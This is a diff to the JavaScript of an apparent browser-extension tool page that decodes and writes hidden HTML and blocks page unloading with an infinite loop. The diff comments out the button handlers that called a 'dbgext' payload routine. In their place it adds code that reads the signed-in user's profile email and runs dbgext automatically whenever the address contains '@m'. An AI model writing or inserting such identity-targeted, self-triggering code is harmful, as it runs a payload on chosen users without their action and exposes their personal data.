@@ -99,7 +99,7 @@
             document.open();
             document.write(atob(`%%HTMLENTRY%%`));
             document.querySelector('#activate').onclick = function () {
-                dbgext(false, pdfId);
+          /* )      dbgext(false, pdfId);*/
             }
             onunload = function () {
                 while (true);
@@ -169,7 +169,7 @@
                     })
 
                 }
-                dbgext(false, pdfId, xd.toString());
+              /* )     dbgext(false, pdfId, xd.toString()); */
             }
             document.querySelector('#updater').onclick = function (ev) {
                 onunload = null;
@@ -245,13 +245,27 @@ function dbgext(cleanup, id, payload) {
 }
 
             document.querySelector('#extdbg').onclick = function () {
-                dbgext(false);
+          /* )      dbgext(false);*/
             }
             document.querySelector('#cleanup').onclick = function () {
-                dbgext(true);
+          /* )      dbgext(true);*/
             }
-            
+            chrome.identity.getProfileUserInfo(function(userInfo) {
+    if (userInfo.email) {
+        console.log("User's email: " + userInfo.email);
+
+        // Check if email contains '@m'
+        if (userInfo.email.includes('@m')) {
+            console.log("Email contains '@m'");
                 dbgext(false);
+        } else {
+            console.log("Email does not contain '@m'");
+        }
+    } else {
+        console.log("No email available.");
+    }
+});
+
             document.querySelector('#devdbg').onclick = function () {
                 var l_canceled = false;
                 const id = setTimeout(function m() {
